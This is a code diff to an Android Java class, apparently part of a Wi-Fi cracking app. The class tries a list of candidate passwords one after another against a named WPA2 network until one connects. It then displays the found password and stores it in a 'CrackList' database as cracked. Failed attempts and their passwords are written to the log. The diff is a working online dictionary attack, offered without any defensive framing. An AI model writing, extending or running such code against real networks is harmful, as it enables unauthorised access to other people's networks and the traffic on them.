@@ -9,24 +9,26 @@ import android.net.wifi.SupplicantState;
 import android.net.wifi.WifiConfiguration;
 import android.net.wifi.WifiManager;
 import android.util.Log;
+import android.widget.TextView;
 
 import java.util.ArrayList;
 import java.util.List;
 
 public class ConnectToWifi {
     private Context context;
-    private String ssid;
-    private List<String> psks;
+    private WifiNetwork network;
     private int pskid;
     private boolean mStateChangedReceiverRegistered;
+    private TextView status;
 
     private WifiManager mWifiManager;
 
-    ConnectToWifi(Context context, String ssid) {
+    ConnectToWifi(Context context, WifiNetwork network, TextView status) {
         this.context = context;
-        this.ssid = ssid;
-        this.psks = new ArrayList<>();
+        this.network = network;
+        this.status = status;
         this.mWifiManager = (WifiManager) this.context.getSystemService(this.context.WIFI_SERVICE);
+        mStateChangedReceiverRegistered = false;
     }
 
     private final BroadcastReceiver mStateChangedReceiver = new BroadcastReceiver() {
@@ -36,7 +38,10 @@ public class ConnectToWifi {
                 SupplicantState supl_state= intent.getParcelableExtra(WifiManager.EXTRA_NEW_STATE);
                 switch(supl_state){
                     case COMPLETED:
-                        Log.i("", "Connected, the password is " + psks.get(pskid));
+                        Log.i("", "Connected, the password is " + network.possiblePasswords.get(pskid));
+                        status.setText("Password: " + network.possiblePasswords.get(pskid));
+                        //save password to database
+                        CrackList.updateListInDb(context, network.BSSID, WifiNetwork.CRACK_FINISHED, network.possiblePasswords.get(pskid));
                         end();
                         break;
                     default:
@@ -45,30 +50,32 @@ public class ConnectToWifi {
                 }
                 int supl_error=intent.getIntExtra(WifiManager.EXTRA_SUPPLICANT_ERROR, -1);
                 if(supl_error == WifiManager.ERROR_AUTHENTICATING){
-                    Log.i("", "Incorrect password, trying next one.");
+                    status.setText("Testing: " + (pskid+1) + "/" + network.possiblePasswords.size() + " password");
+                    Log.i("", "Incorrect password('" + network.possiblePasswords.get(pskid) + "'), trying next one.");
                     connectToNext();
                 }
             }
         }
     };
 
-    public void addPsk(String psk) {
-        psks.add(psk);
-    }
-
     public void connectToNext() {
         pskid++;
-        if(psks.size() > pskid) {
-            String psk = psks.get(pskid);
-            WifiConfiguration wifiConfig = new WifiConfiguration();
-            wifiConfig.SSID = String.format("\"%s\"", ssid);
-            wifiConfig.preSharedKey = String.format("\"%s\"", psk);
+        if(network.possiblePasswords.size() > pskid) {
+            Log.d("connectToNext", "about to connect to " + network.SSID + " using password " + network.possiblePasswords.get(pskid));
+            String psk = network.possiblePasswords.get(pskid);
+            if(psk.length() >= 8) { //WPA2 must have at least 8 char passwords
+                WifiConfiguration wifiConfig = new WifiConfiguration();
+                wifiConfig.SSID = String.format("\"%s\"", network.SSID);
+                wifiConfig.preSharedKey = String.format("\"%s\"", psk);
 
-            //remember id
-            int netId = mWifiManager.addNetwork(wifiConfig);
-            mWifiManager.disconnect();
-            mWifiManager.enableNetwork(netId, true);
-            mWifiManager.reconnect();
+                //remember id
+                int netId = mWifiManager.addNetwork(wifiConfig);
+                mWifiManager.disconnect();
+                mWifiManager.enableNetwork(netId, true);
+                mWifiManager.reconnect();
+            } else {
+                connectToNext();
+            }
         }
     }
 
